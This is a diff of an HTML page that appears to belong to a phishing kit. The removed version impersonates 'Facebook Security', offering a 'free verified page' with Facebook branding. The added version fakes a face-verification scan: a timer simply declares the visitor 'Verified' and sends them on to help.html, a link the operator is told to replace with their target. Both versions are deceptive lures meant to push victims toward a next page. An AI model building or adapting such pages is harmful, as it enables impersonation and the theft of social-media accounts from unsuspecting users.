@@ -1,177 +1,141 @@
-
+<!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-    <title>verified</title>
-    <link rel="icon" type="image/png" href="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/Facebook_Logo_2023.png?v=1737135554085">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Face Verification</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to bottom, #f9f9f9, #e6e6e6);
+      font-family: 'Segoe UI', Roboto, sans-serif;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-        html,
-        body {
-            height: 0%;
-            width: 100%;
-        }
+    .container {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
 
-        #container {
-            height: 135%;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #f0f2f5;
-        }
+    .scanner-ring {
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      background: conic-gradient(
+        #4caf50,
+        #2196f3,
+        #ff9800,
+        #f44336,
+        #4caf50
+      );
+      animation: spin 2s linear infinite;
+      margin: 0 auto 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-        #box {
-            height: 40%;
-            width: 45%;
-            background-color: rgb(255, 255, 255);
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            flex-direction: column;
-        }
+    .scanner-core {
+      width: 130px;
+      height: 130px;
+      background: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 54px;
+      color: #28a745;
+    }
 
-        #box>img {
-            width: 70px;
-            margin-top: 15px;
-        }
+    .scanner-complete {
+      animation: none;
+      background: #e8f5e9;
+      border: 3px solid #28a745;
+    }
 
-        #data {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 15px;
-        }
+    .status-message {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 12px;
+    }
 
-        #data>h4 {
-            font-size: 25px;
-        }
+    .verified-message {
+      display: none;
+      font-size: 20px;
+      font-weight: bold;
+      color: #2e7d32;
+      margin-top: 10px;
+    }
 
-        #data>img {
-            width: 25px;
-        }
+    .continue-button {
+      display: none;
+      margin-top: 25px;
+      padding: 12px 28px;
+      background-color: #1976d2;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
 
-        .line {
-            height: .7px;
-            background-color: rgba(0, 0, 0, 0.222);
-            width: 90%;
-            margin: 1rem;
-        }
+    .continue-button:hover {
+      background-color: #125ea4;
+    }
 
-        #para h2 {
-            font-size: 16px;
-        }
-
-        #para {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        #para p {
-            margin: 20px 100px 0px 100px;
-            font-size: 14px;
-        }
-
-        #para button {
-            padding: 10px 20px 10px 20px;
-            margin-top: 25px;
-            border: none;
-            border-radius: 2px;
-            font-size: 18px;
-            background-color: #145dbd;
-            cursor: pointer;
-        }
-
-        #para button a {
-            text-decoration: none;
-            color: #fff;
-        }
-
-        #para button:hover {
-            background-color: #03469e;
-        }
-
-        @media (max-width: 500px) {
-            #box {
-                margin: 0;
-                height: 45%;
-                width: 95%;
-                top: 0%;
-            }
-            #box>img {
-                width: 40px;
-            }
-            #data>h4 {
-                font-size: 18px;
-            }
-            #data>img {
-                width: 15px;
-                margin-left: 2px;
-            }
-            .line {
-                height: .5px;
-                width: 90%;
-                margin-left: auto;
-                margin-right: auto;
-                background-color: #00000045;
-            }
-            #para {
-                margin: 0%;
-            }
-            #para>h2 {
-                font-size: 12px;
-                font-weight: 700;
-                margin-bottom: 10px;
-            }
-            #para>p {
-                margin: 5px 15px 0px 15px;
-                font-size: 14px;
-            }
-            #para button {
-                padding: 8px 18px 8px 18px;
-                margin-top: 15px;
-                border: none;
-                border-radius: 2px;
-                font-size: 13px;
-                background-color: #1877F2;
-                cursor: pointer;
-            }
-        }
-    </style>
+    @keyframes spin {
+      0% { transform: rotate(0); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
-
 <body>
-    <div id="container">
-        <div id="box">
-            <img src="facebook photo.jpeg" alt="">
-            <h5 id="groupSubHeader">Facebook Security</h5>
-            <div id="data">
-                <h4>free service</h4> <img src="bluetick.png" alt="">
-            </div>
-            <div class="line"></div>
-            <div id="para">
-                <h2> 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬! 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐞𝐥𝐞𝐜𝐭𝐞𝐝 𝐟𝐨𝐫 𝐚 𝐟𝐫𝐞𝐞 𝐯𝐞𝐫𝐢𝐟𝐢𝐞𝐝 𝐩𝐚𝐠𝐞.</h2>click on continue
-                <p>
-                    </p>
-                <button> <a href="help.html">Continue</a> </button>
-            </div>
-        </div>
-    </div>
 
+  <div class="container">
+    <div class="scanner-ring" id="scannerRing">
+      <div class="scanner-core" id="scannerCore"></div>
+    </div>
+    <div class="status-message" id="statusText">Scanning your face securely...</div>
+    <div class="verified-message" id="verifiedText">✅ Verified — You’re Human</div>
+    <button class="continue-button" id="continueBtn">Continue</button>
+  </div>
+
+  <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3" preload="auto"></audio>
+
+  <script>
+    const redirectURL = "help.html"; // Replace this with your target link
+
+    setTimeout(() => {
+      // Play sound
+      document.getElementById("successSound").play();
+
+      // Update ring
+      const ring = document.getElementById("scannerRing");
+      const core = document.getElementById("scannerCore");
+      ring.classList.add("scanner-complete");
+      core.textContent = "✔";
+
+      // Update text and button
+      document.getElementById("statusText").style.display = "none";
+      document.getElementById("verifiedText").style.display = "block";
+      document.getElementById("continueBtn").style.display = "inline-block";
+    }, 3500);
+
+    document.getElementById("continueBtn").addEventListener("click", () => {
+      window.location.href = redirectURL;
+    });
+  </script>
 
 </body>
-
 </html>
-<html lang="en">
